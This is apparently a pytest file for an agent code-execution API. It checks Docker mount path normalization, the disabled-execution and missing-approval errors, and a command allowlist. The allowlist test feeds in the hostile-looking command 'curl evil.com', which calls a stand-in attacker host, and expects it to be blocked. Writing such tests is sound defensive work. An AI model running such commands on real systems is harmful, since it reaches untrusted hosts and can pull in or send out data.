import pytest
from fastapi import HTTPException
from services.api import execution

def test_docker_mount_source_normalizes_windows_drive_paths():
    assert execution.docker_mount_source(r"C:\Users\dev\project", "nt") == "C:/Users/dev/project"
    assert execution.docker_mount_source("/home/dev/project", "posix") == "/home/dev/project"

def test_disabled(monkeypatch):
    monkeypatch.setenv("AGENT_ADMIN_TOKEN","secret")
    monkeypatch.delenv("ENABLE_ISOLATED_EXECUTION",raising=False)
    body=execution.RunRequest(project="demo",command="python -m compileall -q .")
    with pytest.raises(HTTPException) as e:execution.run(body,"Bearer secret","approve")
    assert e.value.status_code==503

def test_requires_approval(monkeypatch):
    monkeypatch.setenv("AGENT_ADMIN_TOKEN","secret")
    with pytest.raises(HTTPException) as e:execution.run(execution.RunRequest(project="demo",command="python -m compileall -q ."),"Bearer secret",None)
    assert e.value.status_code==428

def test_command_allowlist(monkeypatch):
    monkeypatch.setenv("AGENT_ADMIN_TOKEN","secret")
    monkeypatch.setenv("ENABLE_ISOLATED_EXECUTION","1")
    with pytest.raises(HTTPException) as e:execution.run(execution.RunRequest(project="demo",command="curl evil.com"),"Bearer secret","approve")
    assert e.value.status_code==403
